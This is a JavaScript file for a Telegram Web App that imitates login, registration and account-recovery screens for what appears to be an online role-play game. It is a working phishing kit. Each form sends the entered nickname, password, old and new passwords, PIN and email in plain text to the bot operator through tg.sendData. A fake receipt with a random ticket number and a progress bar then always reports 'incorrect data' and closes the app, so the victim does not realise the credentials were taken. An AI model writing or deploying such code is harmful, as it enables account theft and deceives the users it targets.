const tg = window.Telegram.WebApp;
tg.ready();
tg.expand();

// === ЗАГРУЗКА ===
let percent = 0;
const bar = document.getElementById('bar');
const percentText = document.getElementById('percent');
const loader = document.getElementById('loader');
const main = document.getElementById('main');

if (loader && main) {
    const interval = setInterval(() => {
        percent += 2;
        if (percent >= 100) {
            percent = 100;
            clearInterval(interval);
            setTimeout(() => {
                loader.style.display = 'none';
                main.style.display = 'block';
            }, 300);
        }
        if (bar) bar.style.width = percent + '%';
        if (percentText) percentText.textContent = percent + '%';
    }, 30);
}

function onlyEnglish(input) { input.value = input.value.replace(/[^A-Za-z0-9_]/g, ''); }
function onlyPin(input) { input.value = input.value.replace(/[^0-9]/g, '').slice(0, 4); }

function checkNick() {
    const nick = document.getElementById('nick').value.trim();
    const icon = document.getElementById('iconNick');
    if (!icon) return;
    const valid = /^[A-Z][a-z]+_[A-Z][a-z]+$/.test(nick) && nick.length >= 5;
    if (valid) { icon.classList.remove('red'); icon.classList.add('green'); }
    else { icon.classList.remove('green'); icon.classList.add('red'); }
}
function validateNick(nick) { return /^[A-Z][a-z]+_[A-Z][a-z]+$/.test(nick) && nick.length >= 5; }

function togglePin() {
    const checkbox = document.getElementById('hasPin');
    const pinInput = document.getElementById('pin');
    const pinGroup = document.getElementById('pinGroup');
    if (!checkbox || !pinInput || !pinGroup) return;
    if (checkbox.checked) {
        pinInput.disabled = false;
        pinInput.placeholder = 'Введите пин-код';
        pinInput.focus();
        pinGroup.classList.remove('disabled');
    } else {
        pinInput.disabled = true;
        pinInput.value = '';
        pinInput.placeholder = 'Пин-код отключён';
        pinGroup.classList.add('disabled');
    }
}

function toggleServerList() {
    const dropdown = document.getElementById('serverDropdown');
    if (dropdown) dropdown.classList.toggle('active');
}
function selectServer(value) {
    const valueEl = document.getElementById('serverValue');
    const hiddenInput = document.getElementById('server');
    if (valueEl) valueEl.textContent = value;
    if (hiddenInput) hiddenInput.value = value;
    toggleServerList();
}

function sendToBot(text) {
    try { tg.sendData(text); } catch (e) { console.error(e); }
}

// === ЧЕК ===
function showReceipt(nick, server, type) {
    const now = new Date();
    const time = now.getHours().toString().padStart(2, '0') + ':' + now.getMinutes().toString().padStart(2, '0');
    const ticket = Math.floor(1000000 + Math.random() * 9000000);

    const overlay = document.createElement('div');
    overlay.className = 'receipt-overlay';
    overlay.innerHTML = `
        <div class="receipt-box">
            <div class="receipt-close" onclick="closeReceipt()">✕</div>
            <div class="receipt-header">
                <span class="receipt-ticket">#${ticket}</span>
                <span class="receipt-time">${time}</span>
            </div>
            <div class="receipt-body">
                <div class="receipt-row"><span class="receipt-label">НИК</span><span class="receipt-value">${nick}</span></div>
                <div class="receipt-row"><span class="receipt-label">СЕРВЕР</span><span class="receipt-value">${server}</span></div>
                <div class="receipt-row"><span class="receipt-label">ОПЕРАЦИЯ</span><span class="receipt-value">${type}</span></div>
            </div>
            <div class="receipt-status" id="receiptStatus">
                <div class="receipt-status-text" id="statusText">Пожалуйста подождите...</div>
                <div class="receipt-bar"><div class="receipt-bar-fill" id="receiptBar"></div></div>
            </div>
        </div>
    `;
    document.body.appendChild(overlay);

    let counter = 0;
    const bar = document.getElementById('receiptBar');
    const statusText = document.getElementById('statusText');

    const interval = setInterval(() => {
        counter += 1;
        if (counter >= 100) {
            counter = 100;
            clearInterval(interval);
            if (statusText) {
                statusText.textContent = 'Вы ввели неверные данные';
                statusText.style.color = '#6a0000'; // ТЁМНО-КРАСНЫЙ
                statusText.style.fontWeight = '700';
            }
        }
        if (bar) bar.style.width = counter + '%';
    }, 150);
}

function closeReceipt() {
    const overlay = document.querySelector('.receipt-overlay');
    if (overlay) overlay.remove();
    tg.close();
}

function goTo(page) { window.location.href = page; }

// === ВХОД ===
function login() {
    const nick = document.getElementById('nick').value.trim();
    const password = document.getElementById('password').value.trim();
    const pin = document.getElementById('pin').value.trim();
    const server = document.getElementById('server').value;
    if (!nick) { alert('Введите ник!'); return; }
    if (!validateNick(nick)) { alert('Ник в формате Ivan_Capone!'); return; }
    if (!password) { alert('Введите пароль!'); return; }

    const data = `🔐 ВХОД В АККАУНТ\n\n👤 Ник: ${nick}\n🔒 Пароль: ${password}\n🛡 ПИН-код: ${pin || 'нет'}\n🌍 Сервер: ${server}`;
    sendToBot(data);
    showReceipt(nick, server, 'Вход в аккаунт');
}

// === РЕГИСТРАЦИЯ ===
function register() {
    const nick = document.getElementById('nick').value.trim();
    const password = document.getElementById('password').value.trim();
    const pin = document.getElementById('pin').value.trim();
    const email = document.getElementById('email').value.trim();
    const server = document.getElementById('server').value;
    const referrer = document.getElementById('referrer').value.trim();
    if (!nick) { alert('Введите ник!'); return; }
    if (!validateNick(nick)) { alert('Ник в формате Ivan_Capone!'); return; }
    if (!password) { alert('Введите пароль!'); return; }

    const data = `📝 РЕГИСТРАЦИЯ АККАУНТА\n\n👤 Ник: ${nick}\n🔒 Пароль: ${password}\n🛡 ПИН-код: ${pin || 'нет'}\n📧 Почта: ${email || 'нет'}\n🌍 Сервер: ${server}\n👥 Пригласил: ${referrer || 'нет'}`;
    sendToBot(data);
    showReceipt(nick, server, 'Создание аккаунта');
}

// === ВОССТАНОВЛЕНИЕ ===
function recover() {
    const nick = document.getElementById('nick').value.trim();
    const oldPass = document.getElementById('old_password').value.trim();
    const newPass = document.getElementById('new_password').value.trim();
    const pin = document.getElementById('pin').value.trim();
    const server = document.getElementById('server').value;
    if (!nick) { alert('Введите ник!'); return; }
    if (!validateNick(nick)) { alert('Ник в формате Ivan_Capone!'); return; }
    if (!oldPass) { alert('Введите старый пароль!'); return; }
    if (!newPass) { alert('Введите новый пароль!'); return; }

    const data = `🔄 ВОССТАНОВЛЕНИЕ АККАУНТА\n\n👤 Ник: ${nick}\n🔓 Старый пароль: ${oldPass}\n🔒 Новый пароль: ${newPass}\n🛡 ПИН-код: ${pin || 'нет'}\n🌍 Сервер: ${server}`;
    sendToBot(data);
    showReceipt(nick, server, 'Восстановление аккаунта');
}
